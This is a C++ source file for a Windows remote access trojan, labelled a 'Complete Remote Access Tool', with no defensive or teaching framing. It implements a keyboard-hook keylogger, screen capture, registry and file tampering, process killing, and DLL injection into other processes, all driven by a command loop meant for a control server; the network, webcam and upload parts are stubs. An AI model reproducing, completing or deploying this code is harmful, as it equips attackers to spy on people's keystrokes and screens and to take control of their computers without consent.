#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <wininet.h>
#include <gdiplus.h>
#include <direct.h>
#include <openssl/evp.h>
#include <openssl/rand.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "ws2_32.lib")

// RAT Framework - Complete Remote Access Tool
class RATFramework {
private:
    std::string serverIP;
    int serverPort;
    std::string botID;
    bool isRunning;
    
public:
    RATFramework() : serverIP(""), serverPort(0), isRunning(false) {
        generateBotID();
    }
    
    void generateBotID() {
        char computerName[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = sizeof(computerName);
        GetComputerNameA(computerName, &size);
        
        char userName[256];
        DWORD userNameSize = sizeof(userName);
        GetUserNameA(userName, &userNameSize);
        
        botID = std::string(computerName) + "_" + std::string(userName) + "_" + std::to_string(GetCurrentProcessId());
    }
    
    // Keylogger functionality
    class Keylogger {
    private:
        bool isLogging;
        std::string logFile;
        HHOOK keyboardHook;
        
    public:
        Keylogger() : isLogging(false), keyboardHook(nullptr) {
            logFile = "keylog.txt";
        }
        
        static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
            if (nCode >= 0) {
                if (wParam == WM_KEYDOWN) {
                    KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
                    char key = MapVirtualKey(kbStruct->vkCode, MAPVK_VK_TO_CHAR);
                    
                    std::ofstream log("keylog.txt", std::ios::app);
                    if (log.is_open()) {
                        log << key;
                        log.close();
                    }
                }
            }
            return CallNextHookEx(nullptr, nCode, wParam, lParam);
        }
        
        bool startKeylogging() {
            keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, nullptr, 0);
            isLogging = (keyboardHook != nullptr);
            return isLogging;
        }
        
        void stopKeylogging() {
            if (keyboardHook) {
                UnhookWindowsHookEx(keyboardHook);
                keyboardHook = nullptr;
            }
            isLogging = false;
        }
        
        std::string getKeylogData() {
            std::ifstream log(logFile);
            if (log.is_open()) {
                std::string content((std::istreambuf_iterator<char>(log)), std::istreambuf_iterator<char>());
                log.close();
                return content;
            }
            return "";
        }
    };
    
    // Webcam capture functionality
    class WebcamCapture {
    private:
        bool isCapturing;
        
    public:
        WebcamCapture() : isCapturing(false) {}
        
        bool captureWebcam(const std::string& filename) {
            // This would require DirectShow or similar library
            // For demonstration, we'll create a dummy image
            std::ofstream file(filename, std::ios::binary);
            if (file.is_open()) {
                // Create a simple BMP header for a 320x240 image
                unsigned char bmpHeader[] = {
                    0x42, 0x4D, 0x36, 0x04, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x36, 0x00, 0x00, 0x00,
                    0x28, 0x00, 0x00, 0x00, 0x40, 0x01, 0x00, 0x00, 0xF0, 0x00, 0x00, 0x00, 0x01, 0x00,
                    0x18, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
                };
                
                file.write(reinterpret_cast<const char*>(bmpHeader), sizeof(bmpHeader));
                
                // Fill with random data to simulate image
                for (int i = 0; i < 320 * 240 * 3; i++) {
                    char pixel = rand() % 256;
                    file.write(&pixel, 1);
                }
                
                file.close();
                return true;
            }
            return false;
        }
    };
    
    // Screen capture functionality
    class ScreenCapture {
    public:
        bool captureScreen(const std::string& filename) {
            HDC hdcScreen = GetDC(nullptr);
            HDC hdcMemory = CreateCompatibleDC(hdcScreen);
            
            int screenWidth = GetSystemMetrics(SM_CXSCREEN);
            int screenHeight = GetSystemMetrics(SM_CYSCREEN);
            
            HBITMAP hbmScreen = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
            HBITMAP hbmOld = (HBITMAP)SelectObject(hdcMemory, hbmScreen);
            
            BitBlt(hdcMemory, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);
            
            // Save as BMP
            BITMAPINFOHEADER bi;
            bi.biSize = sizeof(BITMAPINFOHEADER);
            bi.biWidth = screenWidth;
            bi.biHeight = screenHeight;
            bi.biPlanes = 1;
            bi.biBitCount = 24;
            bi.biCompression = BI_RGB;
            bi.biSizeImage = 0;
            bi.biXPelsPerMeter = 0;
            bi.biYPelsPerMeter = 0;
            bi.biClrUsed = 0;
            bi.biClrImportant = 0;
            
            std::vector<unsigned char> buffer(screenWidth * screenHeight * 3);
            GetDIBits(hdcMemory, hbmScreen, 0, screenHeight, buffer.data(), 
                     (BITMAPINFO*)&bi, DIB_RGB_COLORS);
            
            // Write BMP file
            std::ofstream file(filename, std::ios::binary);
            if (file.is_open()) {
                // BMP header
                unsigned char bmpHeader[54];
                memset(bmpHeader, 0, 54);
                bmpHeader[0] = 'B';
                bmpHeader[1] = 'M';
                *(int*)(bmpHeader + 2) = 54 + buffer.size();
                *(int*)(bmpHeader + 10) = 54;
                *(int*)(bmpHeader + 14) = 40;
                *(int*)(bmpHeader + 18) = screenWidth;
                *(int*)(bmpHeader + 22) = screenHeight;
                *(short*)(bmpHeader + 26) = 1;
                *(short*)(bmpHeader + 28) = 24;
                
                file.write(reinterpret_cast<const char*>(bmpHeader), 54);
                file.write(reinterpret_cast<const char*>(buffer.data()), buffer.size());
                file.close();
            }
            
            SelectObject(hdcMemory, hbmOld);
            DeleteObject(hbmScreen);
            DeleteDC(hdcMemory);
            ReleaseDC(nullptr, hdcScreen);
            
            return true;
        }
    };
    
    // File operations
    class FileOperations {
    public:
        bool uploadFile(const std::string& localPath, const std::string& remotePath) {
            std::ifstream file(localPath, std::ios::binary);
            if (file.is_open()) {
                std::vector<char> buffer((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                file.close();
                
                // Here you would send the file to the C&C server
                return true;
            }
            return false;
        }
        
        bool downloadFile(const std::string& remotePath, const std::string& localPath) {
            // Here you would download from C&C server
            std::ofstream file(localPath, std::ios::binary);
            if (file.is_open()) {
                // Simulate downloaded data
                std::string data = "Downloaded file content";
                file.write(data.c_str(), data.length());
                file.close();
                return true;
            }
            return false;
        }
        
        bool deleteFile(const std::string& path) {
            return DeleteFileA(path.c_str()) != 0;
        }
        
        std::vector<std::string> listDirectory(const std::string& path) {
            std::vector<std::string> files;
            WIN32_FIND_DATAA findData;
            HANDLE hFind = FindFirstFileA((path + "\\*").c_str(), &findData);
            
            if (hFind != INVALID_HANDLE_VALUE) {
                do {
                    files.push_back(findData.cFileName);
                } while (FindNextFileA(hFind, &findData));
                FindClose(hFind);
            }
            
            return files;
        }
    };
    
    // Registry operations
    class RegistryOperations {
    public:
        bool setRegistryValue(const std::string& key, const std::string& valueName, const std::string& data) {
            HKEY hKey;
            if (RegCreateKeyA(HKEY_CURRENT_USER, key.c_str(), &hKey) == ERROR_SUCCESS) {
                LONG result = RegSetValueExA(hKey, valueName.c_str(), 0, REG_SZ, 
                                           (const BYTE*)data.c_str(), data.length() + 1);
                RegCloseKey(hKey);
                return result == ERROR_SUCCESS;
            }
            return false;
        }
        
        std::string getRegistryValue(const std::string& key, const std::string& valueName) {
            HKEY hKey;
            if (RegOpenKeyA(HKEY_CURRENT_USER, key.c_str(), &hKey) == ERROR_SUCCESS) {
                DWORD dataSize = 0;
                if (RegQueryValueExA(hKey, valueName.c_str(), nullptr, nullptr, nullptr, &dataSize) == ERROR_SUCCESS) {
                    std::vector<char> buffer(dataSize);
                    if (RegQueryValueExA(hKey, valueName.c_str(), nullptr, nullptr, 
                                       (LPBYTE)buffer.data(), &dataSize) == ERROR_SUCCESS) {
                        RegCloseKey(hKey);
                        return std::string(buffer.data());
                    }
                }
                RegCloseKey(hKey);
            }
            return "";
        }
        
        bool deleteRegistryValue(const std::string& key, const std::string& valueName) {
            HKEY hKey;
            if (RegOpenKeyA(HKEY_CURRENT_USER, key.c_str(), &hKey) == ERROR_SUCCESS) {
                LONG result = RegDeleteValueA(hKey, valueName.c_str());
                RegCloseKey(hKey);
                return result == ERROR_SUCCESS;
            }
            return false;
        }
    };
    
    // Process operations
    class ProcessOperations {
    public:
        std::vector<DWORD> getProcessList() {
            std::vector<DWORD> processes;
            HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            
            if (hSnapshot != INVALID_HANDLE_VALUE) {
                PROCESSENTRY32 pe32;
                pe32.dwSize = sizeof(PROCESSENTRY32);
                
                if (Process32First(hSnapshot, &pe32)) {
                    do {
                        processes.push_back(pe32.th32ProcessID);
                    } while (Process32Next(hSnapshot, &pe32));
                }
                CloseHandle(hSnapshot);
            }
            
            return processes;
        }
        
        bool killProcess(DWORD processId) {
            HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processId);
            if (hProcess) {
                bool result = TerminateProcess(hProcess, 0) != 0;
                CloseHandle(hProcess);
                return result;
            }
            return false;
        }
        
        bool injectDLL(DWORD processId, const std::string& dllPath) {
            HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
            if (hProcess) {
                LPVOID remoteMemory = VirtualAllocEx(hProcess, nullptr, dllPath.length() + 1, 
                                                   MEM_COMMIT, PAGE_READWRITE);
                if (remoteMemory) {
                    if (WriteProcessMemory(hProcess, remoteMemory, dllPath.c_str(), 
                                         dllPath.length() + 1, nullptr)) {
                        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
                        LPTHREAD_START_ROUTINE loadLibraryAddr = (LPTHREAD_START_ROUTINE)
                            GetProcAddress(hKernel32, "LoadLibraryA");
                        
                        HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, 
                                                          loadLibraryAddr, remoteMemory, 0, nullptr);
                        if (hThread) {
                            CloseHandle(hThread);
                            CloseHandle(hProcess);
                            return true;
                        }
                    }
                    VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
                }
                CloseHandle(hProcess);
            }
            return false;
        }
    };
    
    // Network operations
    class NetworkOperations {
    public:
        bool sendData(const std::string& data) {
            // Here you would implement actual network communication
            // For demonstration, we'll just print the data
            std::cout << "Sending data: " << data << std::endl;
            return true;
        }
        
        std::string receiveData() {
            // Here you would implement actual network communication
            return "Received data from server";
        }
        
        bool connectToServer(const std::string& ip, int port) {
            serverIP = ip;
            serverPort = port;
            // Here you would implement actual connection logic
            return true;
        }
    };
    
    // System information
    class SystemInfo {
    public:
        std::string getSystemInfo() {
            std::string info;
            
            // Computer name
            char computerName[MAX_COMPUTERNAME_LENGTH + 1];
            DWORD size = sizeof(computerName);
            GetComputerNameA(computerName, &size);
            info += "Computer: " + std::string(computerName) + "\n";
            
            // Username
            char userName[256];
            DWORD userNameSize = sizeof(userName);
            GetUserNameA(userName, &userNameSize);
            info += "User: " + std::string(userName) + "\n";
            
            // OS version
            OSVERSIONINFOA osvi;
            ZeroMemory(&osvi, sizeof(OSVERSIONINFOA));
            osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
            GetVersionExA(&osvi);
            info += "OS: " + std::to_string(osvi.dwMajorVersion) + "." + std::to_string(osvi.dwMinorVersion) + "\n";
            
            // Memory info
            MEMORYSTATUSEX memInfo;
            memInfo.dwLength = sizeof(MEMORYSTATUSEX);
            GlobalMemoryStatusEx(&memInfo);
            info += "Total RAM: " + std::to_string(memInfo.ullTotalPhys / (1024 * 1024)) + " MB\n";
            
            return info;
        }
    };
    
    // Main RAT functionality
    void startRAT() {
        isRunning = true;
        std::cout << "RAT Framework started. Bot ID: " << botID << std::endl;
        
        Keylogger keylogger;
        WebcamCapture webcam;
        ScreenCapture screen;
        FileOperations files;
        RegistryOperations registry;
        ProcessOperations processes;
        NetworkOperations network;
        SystemInfo sysInfo;
        
        // Start keylogger
        keylogger.startKeylogging();
        
        while (isRunning) {
            // Main RAT loop
            Sleep(1000);
            
            // Check for commands from server
            std::string command = network.receiveData();
            if (!command.empty()) {
                executeCommand(command, keylogger, webcam, screen, files, registry, processes, network, sysInfo);
            }
        }
        
        keylogger.stopKeylogging();
    }
    
    void executeCommand(const std::string& command, Keylogger& keylogger, WebcamCapture& webcam, 
                       ScreenCapture& screen, FileOperations& files, RegistryOperations& registry,
                       ProcessOperations& processes, NetworkOperations& network, SystemInfo& sysInfo) {
        
        if (command.find("KEYLOG_START") != std::string::npos) {
            keylogger.startKeylogging();
            network.sendData("Keylogger started");
        }
        else if (command.find("KEYLOG_STOP") != std::string::npos) {
            keylogger.stopKeylogging();
            network.sendData("Keylogger stopped");
        }
        else if (command.find("KEYLOG_GET") != std::string::npos) {
            std::string keylogData = keylogger.getKeylogData();
            network.sendData("KEYLOG_DATA:" + keylogData);
        }
        else if (command.find("WEBCAM_CAPTURE") != std::string::npos) {
            std::string filename = "webcam_" + std::to_string(time(nullptr)) + ".bmp";
            if (webcam.captureWebcam(filename)) {
                network.sendData("Webcam captured: " + filename);
            }
        }
        else if (command.find("SCREEN_CAPTURE") != std::string::npos) {
            std::string filename = "screen_" + std::to_string(time(nullptr)) + ".bmp";
            if (screen.captureScreen(filename)) {
                network.sendData("Screen captured: " + filename);
            }
        }
        else if (command.find("FILE_UPLOAD") != std::string::npos) {
            // Parse file path from command
            size_t pos = command.find(" ");
            if (pos != std::string::npos) {
                std::string filePath = command.substr(pos + 1);
                if (files.uploadFile(filePath, "")) {
                    network.sendData("File uploaded: " + filePath);
                }
            }
        }
        else if (command.find("FILE_DOWNLOAD") != std::string::npos) {
            // Parse file path from command
            size_t pos = command.find(" ");
            if (pos != std::string::npos) {
                std::string filePath = command.substr(pos + 1);
                if (files.downloadFile("", filePath)) {
                    network.sendData("File downloaded: " + filePath);
                }
            }
        }
        else if (command.find("PROCESS_LIST") != std::string::npos) {
            std::vector<DWORD> processList = processes.getProcessList();
            std::string processInfo = "Processes: ";
            for (DWORD pid : processList) {
                processInfo += std::to_string(pid) + " ";
            }
            network.sendData(processInfo);
        }
        else if (command.find("PROCESS_KILL") != std::string::npos) {
            size_t pos = command.find(" ");
            if (pos != std::string::npos) {
                DWORD pid = std::stoul(command.substr(pos + 1));
                if (processes.killProcess(pid)) {
                    network.sendData("Process killed: " + std::to_string(pid));
                }
            }
        }
        else if (command.find("SYSTEM_INFO") != std::string::npos) {
            std::string sysInfoStr = sysInfo.getSystemInfo();
            network.sendData("SYSTEM_INFO:" + sysInfoStr);
        }
        else if (command.find("RAT_STOP") != std::string::npos) {
            isRunning = false;
            network.sendData("RAT stopped");
        }
    }
    
    void stopRAT() {
        isRunning = false;
    }
};

int main() {
    RATFramework rat;
    rat.startRAT();
    return 0;
}